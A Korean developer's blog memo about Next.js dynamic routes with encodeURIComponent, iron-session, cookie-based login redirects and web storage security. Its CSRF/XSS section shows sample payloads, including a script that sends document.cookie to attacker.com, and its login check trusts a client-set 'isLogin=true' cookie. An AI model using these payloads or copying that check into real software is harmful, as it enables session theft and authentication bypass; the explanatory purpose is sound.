---
layout: post
title: "[241030] encodeURIComponent, iron-session, 웹 스토리지 등"
date: 2024-10-30 00:00:00 +0900
categories: memo
---

### [id]로 쓰려던 해쉬값에 슬래쉬(/) 가 들어가버렸다!

nextJS 프로젝트를 하다보면 제일 자주 사용하는 기능. dynamic routes.

`pages/blog/[slug].js` 이렇게 파일을 경로를 지정하면 url이 `/blog/...` 일 때 해당 파일이 렌더링 되고 …값이 [slug]에 저장되는 형태이다.

[slug]값은 useRouter로 가져올 수 있다. 예를 들어 /blog/a 라는 주소에 들어왔다면

```jsx
import { useRouter } from "next/router";

export default function Page() {
  const router = useRouter();
  return <p>Post: {router.query.slug}</p>;
}
//	{ slug: 'a' }
```

이렇게 쏙 값을 빼올 수 있다. _(물론 react나 바닐라 js에서도 경로에 있는 값을 가져오는 방법은 있다. Nextjs가 좀 더 쉽게 만들어놨을뿐)_

https://nextjs.org/docs/pages/building-your-application/routing/dynamic-routes

어쨌든 그래서 해당 기능을 (유저 정보를 조회하거나 게시글을 조회할 때 등) 틀은 같지만 안의 데이터만 달라질 때 사용한다.

서두가 길어졌는데 여튼 유저마다 고유의 hash값을 가진채로 서버에서 보내주는데 이를 URL에 넣어 페이지를 구별하려고 했다. `/info/[hash]` 이런식으로. 그리고 이 값을 가지고 조회 페이지에서 유저의 정보를 조회해와야 했었다.

근데 서버가 보내준 hash값에 ‘/’가 들어가있어 URL에 들어가는 순간 다른 패스파라미터로 되어 info 페이지에서 쪼개진 hash값을 찾아버리는 문제가 생겼다.

**생각해낸 해결법**

1. **‘/’값만 임의로 다른 값으로 대체한다**
   1. 대체한 값이 기존 해시값에 존재하면 나중에 다시 되돌릴 때 그 값도 같이 대체되기 때문에 불가능
2. **btoa - atob를 사용하여 base64로 인코딩된 문자열을 만들고 조회 페이지에서 디코딩하여 원래 값을 가져온다.**
   1. https://developer.mozilla.org/ko/docs/Web/API/Window/btoa
   2. 이진문자열에서 base64로 인코딩된 ASCII 문자열을 생성한다. 통신 문제를 일으킬 수 있는 데이터를 인코딩한다.
   3. 근래에 btoa 함수를 쓸 일이 많아서 가장 먼저 떠올랐는데, 굳이 인코딩안 해도 되는 값도 인코딩하기 때문에 url만 길어지고 별로였다. 보통 이런 용도로 안 쓸 것 같기도 하고.
3. **encodeURIComponent - decodeURIComponent ✅**

   1. https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURIComponent

   ```jsx
   A–Z a–z 0–9 - _ . ! ~ * ' ( )
   ```

   위 문자를 제외하고 모두 UTF-8 방식으로 인코딩한다. (그러므로 /도 인코딩된다)

   참고로 encodeURI는 아래 문자를 제외하고 인코딩한다.

   ```jsx
     A-Z a-z 0-9 ; , / ? : @ & = + $ - _ . ! ~ * ' ( ) #
   ```

### iron-session

프로젝트에서 사용하길래 찾아봤다.

https://github.com/vvo/iron-session

- JavaScript를 위한 안전하고, 상태 비저장이며, 쿠키 기반 세션 라이브러리입니다.
- 세션 데이터는 서명되고 암호화된 쿠키에 저장되면 이는 서버 코드에서 상태 없는 방식으로 디코딩된다.
  _(그냥 봐서는 잘 모르겠어서 직접 코드로 짜봐야 알 것 같다)_

### 브라우저에서 cookie 설정하고 getServerSideProps에서 읽기

- 로그인을 해야만 접근할 수 있는 Nextjs 프로젝트를 맡았는데 서버에서 주는 인증토큰이 따로 없어서 로그인할 때 프론트에서 로그인 여부를 저장했어야 했다.
- 처음엔 encrypt된 값을 sessionStorage에 담아놓고 useEffect로 판단했는데 ‘/’ 로 접근할때마다 로그인이 안되어있으면 잠깐 메인페이지가 보였다가 로그인 페이지로 이동하는 모습이 마음에 안들었다. 물론 그 부분은 처리해주면 되긴 하지만 코드가 넘 지저분해지고 nextjs를 쓰는 이유도 사라진다고 생각했다.
- 그래서 쿠키를 사용하기로 했다. _(탭을 닫았을 때 로그인이 풀렸으면 좋겠다고 의견이 나와서 sessionStorage로 나중엔 돌아가긴 했다…)_
  - 우선 nextjs의 api route를 사용해서 로그인에 성공하면 로그인 여부를 구별할 수 있는 cookie를 setting하는 api route를 호출했다. (https://nextjs.org/docs/pages/building-your-application/routing/api-routes)
  - 그리고 그걸 getServerSideProps에서 읽어와서 redirect하는 방식으로 구현했다.
  - 좋은 방법인지는 모르겠다. 제일 좋은 방법은 서버에서 인증토큰을 보내주는 방법이겠지… 😓

```jsx
export async function getServerSideProps({ req }: { req: any }) {
  const cookies = req.headers.cookie;
  if (!(cookies && cookies.includes("isLogin=true")))
    return {
      redirect: {
        destination: "/login",
        permanent: false,
      },
    };

  return { props: {} };
}
```

```jsx
//react-cookie 사
const cookies = new Cookies();
cookies.set("isLogin", true);
```

### 쿠키, 세션, 세션스토리지, 로컬스토리지…

갑자기 든 의문: 세션스토리지는 왜 세션스토리지일까? 그리고 세션스토리지와 로컬스토리지는 얼마나 안전할까…

https://developer.mozilla.org/ko/docs/Web/API/Window/sessionStorage

- SessionStorage: 페이지 세션은 브라우저가 열려있는 한 새로고침과 페이지 복구를 거쳐도 남아있습니다. _→ 아무래도 브라우저 세션동안에만 저장되기 때문에 세션 스토리지인가보다._
- 인터넷에 검색해보니까 CSRF에서는 안전하고 XSS에는 취약하다는데 잘 와닿지 않는다.

- **CSRF (Cross-Site Request Forgery)**
  - 교차 사이트 요청 위조, **신뢰할 수 있는 사용자를 사칭**해 웹 사이트에 원하지 않는 명령을 보내는 공격
  - 사용자를 속여 의도치 않은 요청을 보내게 만든다. **(서버로 공격)** 피해자가 **인증된 상태**임을 악용해 요청을 실행한다.
    ex) A씨가 은행 웹사이트 `http://bank.com`에 로그인한 상태로 브라우저를 열어 둔 채, 이메일을 확인한다. 공격자는 이메일에 아래 html을 숨긴다.
    `<img src="http://bank.com/transfer?to=attacker&amount=1000" />`
    위의 url은 은행 웹사이트에서 get method로 to에게 amount 만큼을 송금하는 url이다. (해당 url은 네트워크 탭으로 분석하면 금방 알아낼 수 있다) A씨가 이메일을 열고 이미지를 로드하는 순간, 브라우저는 `bank.com`에 요청을 보낸다.
    `bank.com` 서버는 이 요청을 정당한 사용자(A씨)가 보낸 것으로 판단하고, A씨 계정에서 공격자 계정으로 1000원이 이체된다.
    **→ 대응방법:** 쿠키에 SameSite 속성을 설정한다. Referer 또는 Origin 헤더를 거증한다.
    이런 이유로 대부분의 안전한 시스템은 민감한 작업은 POST 요청으로 처리한다. (물론 POST 요청도 FORM 요청 등으로 조작 가능 하지만 GET보단 까다롭다)
- **XSS** (Cross Site Scripting)
  - 공격자가 웹사이트에 **악성 클라이언트 사이드 코드를 삽입할 수 있도록 하는 보안 취약점 공격**
  - 주로 피해자의 브라우저에서 실행된다.

```jsx
<script>alert('Your session is stolen!');</script>

<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

이런식으로 script를 브라우저가 실행하게 해 내부의 cookie값을 가져간다.

→ **대응 방법:** 사용자 입력값을 검증, 인코딩한다. httpOnly 쿠키를 설정한다 등

ChatGpt가 잘 요약해줬다.

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d2d0348d-b394-49c9-b6fe-f9ad02f7f098/71d6d277-92fc-422c-b24c-56fefe293a6e/image.png)

`sessionStorage`는 쿠키처럼 HTTP 요청에 자동으로 포함되는 게 아니라서 CSRF에 안전하지만, JavaScript로 접근 가능하므로 XSS에 취약하다.

**[참고 링크]**

https://stackoverflow.com/questions/46206618/when-to-use-btoa-atob-encodeuricomponent-and-decodeuricomponent

https://velog.io/@gonggi_bab/%EC%BF%A0%ED%82%A4%EC%99%80-%EC%9B%B9-%EC%8A%A4%ED%86%A0%EB%A6%AC%EC%A7%80-%EA%B7%B8%EB%A6%AC%EA%B3%A0-%EB%B3%B4%EC%95%88
